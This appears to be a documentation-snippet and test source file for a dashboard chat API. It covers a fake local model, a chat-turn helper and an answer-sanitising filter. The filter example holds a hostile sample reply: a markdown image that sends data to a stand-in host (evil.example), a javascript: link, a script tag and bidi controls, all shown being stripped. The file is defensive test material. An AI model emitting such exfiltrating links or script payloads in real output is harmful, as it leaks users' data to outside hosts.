"""Ask about your dashboard (v0.20): the fake chat model, one chat turn over HTTP, and the
answer filter.

Included by ``docs/guides/ask-about-your-dashboard.md``. Run by
``conformance/tests/test_docs_snippets.py`` (the parts that need no server) and by
``conformance/tests/test_docs_chat_mcp.py``, which also calls :func:`ask` against an
in-process API with a fixture dashboard and the fake model. Nothing here calls Gemini or
the network.
"""

# ruff: noqa: E402  (each included section starts with its own imports)
from __future__ import annotations

import asyncio
from collections.abc import Sequence
from typing import Any

# --8<-- [start:local]
from mapi_server.services.chat.model import build_chat_model, dashboard_function_decls
from mapi_server.settings import Settings
from pydantic import ValidationError

# MAPI_CHAT_PROVIDER=fake: a fixed local model that makes no network call
local = Settings(chat_provider="fake")
model = build_chat_model(local)
assert model is not None
print(model.model_id)  # fake-chat
print(len(dashboard_function_decls()))  # 14: the model gets the dashboard tools only

# the fake model is for development only: a cloud deployment refuses it
try:
    Settings(chat_provider="fake", profile="multi-tenant", trusted_proxies="none")
except ValidationError as err:
    print("refused:", "MAPI_CHAT_PROVIDER=fake is for local development" in str(err))

# Gemini needs a key (MAPI_GEMINI_API_KEY); without one the server does not start
try:
    Settings(chat_provider="gemini")
except ValidationError as err:
    print("refused:", "needs MAPI_GEMINI_API_KEY" in str(err))
# --8<-- [end:local]


# --8<-- [start:ask]
from mapi_spec.chat import ChatResponse


async def ask(
    http: Any,
    url: str,
    question: str,
    history: Sequence[dict[str, Any]] = (),
    conversation_id: str | None = None,
) -> ChatResponse:
    """Ask one question. ``url`` is ``/v1/dashboards/{id}/chat`` (signed in) or
    ``/v1/shared/chat`` (with the ``X-Mapi-Share`` session header). To continue a chat,
    give the earlier turns (your questions, and the answers exactly as the server sent them,
    with their ``sig``) and the ``conversation_id`` of the first answer."""
    body: dict[str, Any] = {"messages": [*history, {"role": "user", "text": question}]}
    if conversation_id is not None:
        body["conversation_id"] = conversation_id
    r = await http.post(url, json=body)
    r.raise_for_status()
    return ChatResponse.model_validate(r.json())


def turns(question: str, res: ChatResponse) -> list[dict[str, Any]]:
    """The two turns to send back with the next question (the signed answer unchanged)."""
    return [
        {"role": "user", "text": question},
        {"role": "assistant", "text": res.reply.text, "sig": res.reply.sig},
    ]


# --8<-- [end:ask]


# --8<-- [start:clean]
from mapi_server.services.chat.postfilter import clean_reply, ungrounded_numbers

# a hostile answer: an image that would send data away, a link, HTML and bidi controls
hostile = (
    "Sales were **1,234,567**. ![chart](https://evil.example/?d=secret) "
    "[Read more](javascript:alert(1)) <script>x()</script>‮TV‬"
)
print(clean_reply(hostile))  # Sales were **1,234,567**. chart Read more TV

# every number of an answer must be in a tool result of the same turn
readout = {"tiles": [{"label": "Expected sales", "value": 1234567.0, "delta": 0.042}]}
print(ungrounded_numbers("Sales were 1,234,567, up 4.2%.", [readout]))  # []
print(ungrounded_numbers("Sales were 1,300,000.", [readout]))  # ['1,300,000']
# --8<-- [end:clean]


async def _offline() -> None:
    """The fake model's first step without a server: it asks for the latest readout."""
    from mapi_server.services.chat.model import user_text_turn
    from mapi_server.services.chat.prompt import system_prompt

    reply = await model.generate(
        system=system_prompt(),
        turns=[user_text_turn("What does the latest readout show?")],
        tools=dashboard_function_decls(),
        timeout_s=5,
    )
    print([call.name for call in reply.calls])  # ['get_latest_readout']


if __name__ == "__main__":
    asyncio.run(_offline())
